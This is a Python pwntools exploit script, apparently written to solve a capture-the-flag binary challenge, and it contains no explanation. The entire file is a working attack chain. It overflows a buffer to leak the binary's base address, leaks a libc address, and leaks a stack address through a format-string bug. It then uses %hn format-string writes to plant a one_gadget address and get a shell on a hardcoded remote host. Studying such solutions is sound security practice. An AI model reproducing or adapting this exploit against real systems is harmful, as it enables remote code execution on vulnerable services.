#!/usr/bin/python3

from pwn import *

exe = ELF('./chall_patched', checksec=False)
libc = ELF("./libc.so.6")
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                # b*0x0000555555555401
                b* show_error+23
                c
                c
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('45.153.243.57', 13337)
else:
        p = process(exe.path)

GDB()
def edit(payload):
        sla(b'> ', '1')
        sa(b': ', payload)
def save():
        sla(b'> ', '2')
def leak():
        sla(b'> ', '4')


payload = b'a' * 256 + p16(0x8008)
edit(payload)
leak()
exe.address = u64(p.recv(6).ljust(8, b'\0')) - 0x4008
print(hex(exe.address))
save()

payload = b''
payload = payload.ljust(256) + p64((exe.address+ 0x4140))
edit(payload)
leak()
libc.address = u64(p.recv(6).ljust(8, b'\0')) - 0x216778 -0x4008
print(hex(libc.address))

payload = f"%6$p\0".encode()
payload = payload.ljust(256) + p64((exe.sym.text))
edit(payload)
sla(b'> ', '4')
stack = int(p.recvuntil(b'Menu', drop=True),16)
print(hex(stack))
pop_rdi_addr = stack - 0x128
binsh_addr = stack - 0x128 + 0x8
system_addr = stack-0x128

rop = ROP(libc)

system = libc.address + 0xebcf5
package = {
        ((system) >> 0) & 0xffff : system_addr, 
        ((system) >> 16) & 0xffff : system_addr+2, 
        ((system) >> 32) & 0xffff : system_addr+4, 
}
order = sorted(package.keys())
payload = f'%{order[0]}c%18$hn'.encode()
payload += f'%{order[1] - order[0]}c%19$hn'.encode()
payload += f'%{order[2] - order[1]}c%20$hn'.encode()
payload = payload.ljust(0x40)
payload += flat(
        package[order[0]],
        package[order[1]],
        package[order[2]]
)
payload = payload.ljust(256) + p64((exe.sym.text))
edit(payload)
save()
sla(b'> ', '4')

p.interactive()
